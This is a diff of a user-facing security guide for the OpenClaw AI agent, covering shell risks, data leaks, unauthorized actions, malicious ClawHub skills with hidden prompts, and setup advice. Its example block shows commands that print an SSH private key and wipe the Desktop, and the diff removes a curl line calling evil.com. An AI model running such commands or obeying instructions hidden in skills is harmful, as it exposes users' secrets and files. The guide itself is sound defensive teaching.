@@ -523,10 +523,8 @@ Every **capability** requires a corresponding **permission**. Every **permission
 A **shell** is a command line -- you type commands, your OS executes them. No safety net. No undo button.
 
 ```bash
-ls ~/Documents              # List all your files
 cat ~/.ssh/id_rsa           # Display your private SSH key
 rm -rf ~/Desktop/*          # Delete your entire Desktop
-curl http://evil.com/steal  # Download from the internet
 ```
 
 🦞 OpenClaw can run **any** of these commands without asking you first.
@@ -586,35 +584,29 @@ The more "human-like" your agent, the more susceptible it is to these tactics.
 
 **Real-world example:** A tester asked the AI to run a `find` command. The AI **dumped the entire home directory structure into a group chat**.
 
-A directory structure reveals:
-- What projects you are working on
-- What tools and services you use
-- System configuration details
-- File naming patterns hinting at sensitive content
+A directory listing reveals your projects, tools, config details, and hints about sensitive files.
 
-**Other scenarios:** AI includes email snippets in messages to others, 🔑 API keys end up in log files, 🪸 memory files get accessed by another program.
+**Other scenarios:** Email snippets in messages, 🔑 API keys in log files, 🪸 memory files accessed by another program.
 
-> **Browser control warning:** If the agent has browser access and the browser has logged-in sessions (Gmail, GitHub, banking), the model can access ALL of them. Use a dedicated browser profile.
+> **Browser warning:** If the agent has browser access with logged-in sessions (Gmail, GitHub, banking), it can access ALL of them. Use a dedicated browser profile.
 
 ---
 
 ## Threat Categories 4 and 5
 
 ### 4. Unauthorized Actions
-The AI does things you did not ask for -- from misunderstanding, hallucination, or overzealous helpfulness.
+The AI does things you did not ask for -- from misunderstanding or overzealous helpfulness.
 
 - "Clean up the project" -- AI deletes files you wanted to keep
-- AI installs a software update on its own that breaks something
 - Scheduled task sends a message to the wrong person
 
 ### 5. Supply Chain Attacks (Malicious 🐠 Skills)
 A skill from **ClawHub** contains hidden malicious instructions.
 
 - Skills are YAML + markdown -- easy to embed hidden prompts
-- ClawHub has VirusTotal scanning, but no system is perfect
 - **You are the last line of defense** -- read every skill before installing
 
-**Real incident (2026):** 1,184 malicious skills found on ClawHub. One attacker uploaded 677 packages. The #1 ranked skill ("What Would Elon Do") had 9 vulnerabilities, exfiltrated data silently, and was downloaded thousands of times. Payloads included Atomic Stealer (macOS) and reverse shells.
+**Real incident (2026):** 1,184 malicious skills found on ClawHub. The #1 ranked skill had 9 vulnerabilities and exfiltrated data silently.
 
 ---
 
@@ -659,14 +651,13 @@ If the AI does not recognize this as injection, it executes a **malicious script
 
 ## 🚩 Rough Waters: The $800 🔑 API Bill
 
-**Setup:** User configures pay-per-use API key. Runs 8 agents simultaneously. No spending limit set.
+**Setup:** User configures pay-per-use API key. Runs 8 agents simultaneously. No spending limit.
 
 **What goes wrong:** $800 burned in less than a week before anyone noticed.
 
 **Lessons:**
 - **Always set a hard spending limit** -- Anthropic Console > Settings > Usage Limits
-- **Start with one agent only** -- understand your token burn rate first
-- **Monitor daily for the first week** -- check console.anthropic.com/usage every day
+- **Start with one agent** and monitor daily for the first week
 - **Use cheap models for routine tasks** -- Haiku for heartbeats, Sonnet for simple tasks
 
 ---
@@ -713,12 +704,18 @@ If the AI does not recognize this as injection, it executes a **malicious script
 
 ---
 
-## Principles 3, 4, and 5
+## Principle 3: Authentication
 
-### 3. Authentication and Authorization
+> **Make sure only you can talk to your AI.**
+
+### Authentication and Authorization
 - Enable **⛵ gateway authentication** (token required to connect)
 - Use **DM pairing mode** on Telegram (strangers must enter a code)
 - Give the AI **its own accounts** -- do not share your credentials
+
+---
+
+## Principles 4 and 5
 
 ### 4. Monitoring and Auditability
 - Review **session transcripts** regularly
